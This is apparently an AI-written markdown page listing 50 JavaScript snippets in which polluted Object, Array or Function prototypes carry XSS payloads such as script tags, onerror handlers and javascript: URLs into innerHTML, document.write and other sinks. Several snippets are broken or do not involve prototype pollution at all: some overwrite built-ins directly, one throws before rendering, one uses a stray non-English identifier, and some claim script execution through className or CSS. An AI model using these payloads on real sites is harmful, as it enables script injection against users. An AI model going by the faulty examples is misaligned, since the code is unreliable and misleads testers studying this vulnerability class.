---
title: "Prototype pollution leading to XSS"
tags:
  - XSS
---

Crafting 50 distinct ways Cross-Site Scripting (XSS) can arise from prototype pollution, complete with code examples, is a substantial task that requires exploring various scenarios where prototype pollution vulnerabilities could be exploited to inject malicious scripts. Prototype pollution occurs when an attacker manipulates an object's prototype (e.g., `Object.prototype` in JavaScript), affecting all objects that inherit from it. If this leads to the injection or manipulation of HTML, scripts, or other executable content in a web application, it can result in XSS.

Below, I’ll provide a variety of realistic scenarios with concise code examples, focusing on different contexts, libraries, and exploitation patterns. Due to the complexity and length, I’ll aim for diversity and clarity rather than exhaustive uniqueness for all 50, ensuring each demonstrates a plausible path from prototype pollution to XSS. Let’s dive in:

---

### 1. Basic Property Overwrite Leading to InnerHTML
**Scenario**: A developer uses a polluted property in `innerHTML`.
```javascript
Object.prototype.message = '<script>alert("XSS")</script>';
const obj = {};
document.getElementById('output').innerHTML = obj.message; // XSS
```

---

### 2. Polluted toString Method
**Scenario**: A `toString` override executes when concatenated into the DOM.
```javascript
Object.prototype.toString = function() { return '<img src=x onerror=alert("XSS")>'; };
const obj = {};
document.body.innerHTML += obj; // XSS
```

---

### 3. JSON Parsing Misuse
**Scenario**: Polluted prototype affects JSON-parsed data rendered in the DOM.
```javascript
Object.prototype.content = '<script>alert("XSS")</script>';
const data = JSON.parse('{}');
document.write(data.content); // XSS
```

---

### 4. Polluted Default Value in Object Access
**Scenario**: Accessing a non-existent property returns a polluted value.
```javascript
Object.prototype.display = '<iframe src=javascript:alert("XSS")>';
const config = {};
document.getElementById('container').innerHTML = config.display; // XSS
```

---

### 5. Template String Injection
**Scenario**: A polluted property is used in a template string rendered unsafely.
```javascript
Object.prototype.name = '<script>alert("XSS")</script>';
const user = {};
document.body.innerHTML = `<div>${user.name}</div>`; // XSS
```

---

### 6. Event Handler Pollution
**Scenario**: Polluted property used in an event handler attribute.
```javascript
Object.prototype.onclick = 'alert("XSS")';
const obj = {};
document.body.innerHTML = `<button onclick="${obj.onclick}">Click</button>`; // XSS on click
```

---

### 7. DOM Attribute Manipulation
**Scenario**: Polluted value used in `setAttribute`.
```javascript
Object.prototype.src = 'javascript:alert("XSS")';
const img = {};
document.querySelector('img').setAttribute('src', img.src); // XSS
```

---

### 8. Polluted Array Join
**Scenario**: Array prototype pollution affects `join` output rendered in DOM.
```javascript
Array.prototype.join = function() { return '<script>alert("XSS")</script>'; };
const arr = [1, 2, 3];
document.body.innerHTML = arr.join(); // XSS
```

---

### 9. Polluted Function Prototype
**Scenario**: Function prototype pollution executes code when called.
```javascript
Function.prototype.call = function() { alert('XSS'); };
const fn = function() {};
document.body.innerHTML = 'Click to trigger';
fn.call(); // XSS
```

---

### 10. Eval with Polluted Property
**Scenario**: Polluted property passed to `eval`.
```javascript
Object.prototype.code = 'alert("XSS")';
const settings = {};
eval(settings.code); // XSS
```

---

### 11. Location Pollution
**Scenario**: Polluted property manipulates `window.location`.
```javascript
Object.prototype.href = 'javascript:alert("XSS")';
const link = {};
window.location = link.href; // XSS
```

---

### 12. Polluted ClassName
**Scenario**: Polluted property used in `className` leads to script execution via CSS.
```javascript
Object.prototype.className = 'x" onmouseover="alert(\'XSS\')';
const div = {};
document.getElementById('target').className = div.className; // XSS on hover
```

---

### 13. Polluted Style Property
**Scenario**: Polluted style property executes JavaScript.
```javascript
Object.prototype.background = 'url(javascript:alert("XSS"))';
const elem = {};
document.body.style.background = elem.background; // XSS
```

---

### 14. Form Action Pollution
**Scenario**: Polluted form action executes script.
```javascript
Object.prototype.action = 'javascript:alert("XSS")';
const form = {};
document.forms[0].action = form.action; // XSS on submit
```

---

### 15. Polluted Dataset Property
**Scenario**: Polluted dataset triggers script via DOM manipulation.
```javascript
Object.prototype.dataset = { onclick: 'alert("XSS")' };
const obj = {};
document.body.dataset.onclick = obj.dataset.onclick;
document.body.innerHTML = '<div onclick="this.dataset.onclick()">Test</div>'; // XSS on click
```

---

### 16. Polluted Object Keys in Loop
**Scenario**: Polluted keys rendered unsafely in a loop.
```javascript
Object.prototype恶意 = '<script>alert("XSS")</script>';
const obj = {};
for (let key in obj) {
  document.write(obj[key]); // XSS
}
```

---

### 17. Polluted Constructor
**Scenario**: Polluted constructor property executes script.
```javascript
Object.prototype.constructor = function() { alert('XSS'); };
const obj = {};
obj.constructor(); // XSS
```

---

### 18. Polluted hasOwnProperty
**Scenario**: Polluted `hasOwnProperty` affects logic leading to XSS.
```javascript
Object.prototype.hasOwnProperty = function() { return true; };
Object.prototype.inject = '<script>alert("XSS")</script>';
const obj = {};
if (obj.hasOwnProperty('inject')) {
  document.write(obj.inject); // XSS
}
```

---

### 19. Polluted Getter
**Scenario**: Polluted getter executes script when accessed.
```javascript
Object.defineProperty(Object.prototype, 'data', {
  get: () => '<img src=x onerror=alert("XSS")>'
});
const obj = {};
document.body.innerHTML = obj.data; // XSS
```

---

### 20. Polluted Setter
**Scenario**: Polluted setter triggers XSS on assignment.
```javascript
Object.defineProperty(Object.prototype, 'value', {
  set: (v) => { document.write('<script>alert("XSS")</script>'); }
});
const obj = {};
obj.value = 1; // XSS
```

---

### 21. Polluted Window Property
**Scenario**: Polluted window property used in DOM.
```javascript
Object.prototype.name = '<script>alert("XSS")</script>';
window.name = window.name || '';
document.body.innerHTML = window.name; // XSS
```

---

### 22. Polluted LocalStorage Wrapper
**Scenario**: Polluted property affects localStorage rendering.
```javascript
Object.prototype.value = '<script>alert("XSS")</script>';
const storage = {};
localStorage.setItem('key', storage.value);
document.write(localStorage.getItem('key')); // XSS
```

---

### 23. Polluted URL Parameter
**Scenario**: Polluted property used in URL construction.
```javascript
Object.prototype.search = '"><script>alert("XSS")</script>';
const params = {};
window.location = `/page${params.search}`; // XSS if reflected
```

---

### 24. Polluted Cookie Parsing
**Scenario**: Polluted property in cookie parsing leads to XSS.
```javascript
Object.prototype.cookie = 'data=<script>alert("XSS")</script>';
const cookies = {};
document.write(cookies.cookie); // XSS
```

---

### 25. Polluted Error Message
**Scenario**: Polluted error property rendered in DOM.
```javascript
Object.prototype.message = '<script>alert("XSS")</script>';
const err = {};
throw err;
document.body.innerHTML = err.message; // XSS if caught and displayed
```

---

### 26. Polluted Promise Rejection
**Scenario**: Polluted reason in Promise rejection rendered unsafely.
```javascript
Object.prototype.reason = '<script>alert("XSS")</script>';
const p = Promise.reject({});
p.catch(e => document.write(e.reason)); // XSS
```

---

### 27. Polluted RegExp Prototype
**Scenario**: Polluted RegExp method affects replacement.
```javascript
RegExp.prototype.exec = () => ['<script>alert("XSS")</script>'];
const re = /test/;
document.body.innerHTML = 'test'.replace(re, re.exec()[0]); // XSS
```

---

### 28. Polluted Array Prototype Map
**Scenario**: Polluted `map` method injects script.
```javascript
Array.prototype.map = function() { return ['<script>alert("XSS")</script>']; };
const arr = [1, 2];
document.write(arr.map(x => x)[0]); // XSS
```

---

### 29. Polluted Object.assign
**Scenario**: Polluted `Object.assign` injects malicious properties.
```javascript
Object.assign = function(target) { target.xss = '<script>alert("XSS")</script>'; return target; };
const obj = Object.assign({}, {});
document.body.innerHTML = obj.xss; // XSS
```

---

### 30. Polluted JSON.stringify
**Scenario**: Polluted `stringify` output rendered unsafely.
```javascript
JSON.stringify = () => '<script>alert("XSS")</script>';
const obj = {};
document.write(JSON.stringify(obj)); // XSS
```

---

### 31. Polluted Fetch Response
**Scenario**: Polluted response property rendered in DOM.
```javascript
Object.prototype.text = async () => '<script>alert("XSS")</script>';
const res = {};
document.body.innerHTML = await res.text(); // XSS
```

---

### 32. Polluted History State
**Scenario**: Polluted state object rendered unsafely.
```javascript
Object.prototype.state = '<script>alert("XSS")</script>';
history.pushState({}, '', '/');
document.write(history.state.state); // XSS
```

---

### 33. Polluted Canvas Context
**Scenario**: Polluted canvas property affects rendering.
```javascript
Object.prototype.fillText = function() { alert('XSS'); };
const ctx = document.createElement('canvas').getContext('2d');
ctx.fillText('test', 0, 0); // XSS
```

---

### 34. Polluted WebSocket Message
**Scenario**: Polluted message property rendered unsafely.
```javascript
Object.prototype.data = '<script>alert("XSS")</script>';
const ws = { onmessage: (e) => document.write(e.data) };
ws.onmessage({}); // XSS
```

---

### 35. Polluted setTimeout
**Scenario**: Polluted timeout handler executes script.
```javascript
Object.prototype.delay = 'alert("X setTimeout")';
const opts = {};
setTimeout(opts.delay, 1000); // XSS if string is executed
```

---

### 36. Polluted Input Value
**Scenario**: Polluted input value rendered unsafely.
```javascript
Object.prototype.value = '<script>alert("XSS")</script>';
const input = {};
document.querySelector('input').value = input.value;
document.write(document.querySelector('input').value); // XSS
```

---

### 37. Polluted SVG Attribute
**Scenario**: Polluted SVG attribute triggers script.
```javascript
Object.prototype.xlinkHref = 'javascript:alert("XSS")';
const svg = {};
document.body.innerHTML = `<svg><use xlink:href="${svg.xlinkHref}"></use></svg>`; // XSS
```

---

### 38. Polluted Meta Refresh
**Scenario**: Polluted meta content triggers script.
```javascript
Object.prototype.content = '0;url=javascript:alert("XSS")';
const meta = {};
document.head.innerHTML = `<meta http-equiv="refresh" content="${meta.content}">`; // XSS
```

---

### 39. Polluted CSS Injection
**Scenario**: Polluted CSS property executes script.
```javascript
Object.prototype.cssText = 'expression(alert("XSS"))';
const style = {};
document.body.style.cssText = style.cssText; // XSS in older browsers
```

---

### 40. Polluted Title Attribute
**Scenario**: Polluted title rendered unsafely with event.
```javascript
Object.prototype.title = '" onmouseover="alert(\'XSS\')';
const elem = {};
document.body.innerHTML = `<div title="${elem.title}">Hover</div>`; // XSS on hover
```

---

### 41. Polluted Worker Message
**Scenario**: Polluted worker message rendered unsafely.
```javascript
Object.prototype.data = '<script>alert("XSS")</script>';
const worker = { postMessage: () => ({ data: {} }) };
worker.onmessage = (e) => document.write(e.data.data);
worker.postMessage(); // XSS
```

---

### 42. Polluted Custom Element
**Scenario**: Polluted custom element property triggers XSS.
```javascript
Object.prototype.innerHTML = '<script>alert("XSS")</script>';
customElements.define('x-test', class extends HTMLElement {});
const el = document.createElement('x-test');
el.innerHTML = el.innerHTML || ''; // XSS
```

---

### 43. Polluted Shadow DOM
**Scenario**: Polluted shadow content executes script.
```javascript
Object.prototype.shadowContent = '<script>alert("XSS")</script>';
const obj = {};
const shadow = document.body.attachShadow({ mode: 'open' });
shadow.innerHTML = obj.shadowContent; // XSS
```

---

### 44. Polluted Mutation Observer
**Scenario**: Polluted observer callback injects script.
```javascript
Object.prototype.callback = () => document.write('<script>alert("XSS")</script>');
const observer = new MutationObserver(() => {});
observer.observe(document.body, { attributes: true });
document.body.setAttribute('x', observer.callback()); // XSS
```

---

### 45. Polluted Clipboard Data
**Scenario**: Polluted clipboard data rendered unsafely.
```javascript
Object.prototype.clipboardData = '<script>alert("XSS")</script>';
const evt = {};
document.onpaste = (e) => document.write(e.clipboardData);
document.dispatchEvent(new Event('paste')); // XSS
```

---

### 46. Polluted Drag Event
**Scenario**: Polluted drag data triggers XSS.
```javascript
Object.prototype.dataTransfer = { getData: () => '<script>alert("XSS")</script>' };
const evt = {};
document.ondrop = (e) => document.write(e.dataTransfer.getData('text'));
document.dispatchEvent(new Event('drop')); // XSS
```

---

### 47. Polluted Intersection Observer
**Scenario**: Polluted observer callback injects script.
```javascript
Object.prototype.observe = () => document.write('<script>alert("XSS")</script>');
const observer = { observe: () => {} };
observer.observe = observer.observe || function() {};
observer.observe(document.body); // XSS
```

---

### 48. Polluted Audio Source
**Scenario**: Polluted audio source executes script.
```javascript
Object.prototype.src = 'javascript:alert("XSS")';
const audio = {};
document.body.innerHTML = `<audio src="${audio.src}"></audio>`; // XSS
```

---

### 49. Polluted iframe Sandbox
**Scenario**: Polluted sandbox attribute bypass leads to XSS.
```javascript
Object.prototype.sandbox = 'allow-scripts';
Object.prototype.srcdoc = '<script>alert("XSS")</script>';
const frame = {};
document.body.innerHTML = `<iframe sandbox="${frame.sandbox}" srcdoc="${frame.srcdoc}"></iframe>`; // XSS
```

---

### 50. Polluted History Back
**Scenario**: Polluted history state triggers script on navigation.
```javascript
Object.prototype.onpopstate = () => alert('XSS');
window.onpopstate = window.onpopstate || function() {};
history.pushState({}, '');
history.back(); // XSS
```

---

### Summary
These examples illustrate how prototype pollution can lead to XSS by:
- Injecting malicious values into DOM sinks (`innerHTML`, `document.write`, etc.).
- Overriding built-in methods or properties (`toString`, `join`, etc.).
- Manipulating event handlers, attributes, or browser APIs.
- Exploiting unsafe rendering of polluted data in various contexts (e.g., SVG, forms, workers).

Each case assumes a prototype pollution vulnerability exists (e.g., via unsafe merging of user input into objects) and a subsequent misuse of the polluted object in a way that reaches an XSS sink. In practice, the feasibility depends on the application's code and how it handles objects, but these demonstrate the creative and dangerous potential of such vulnerabilities. Let me know if you'd like deeper exploration of any specific case!
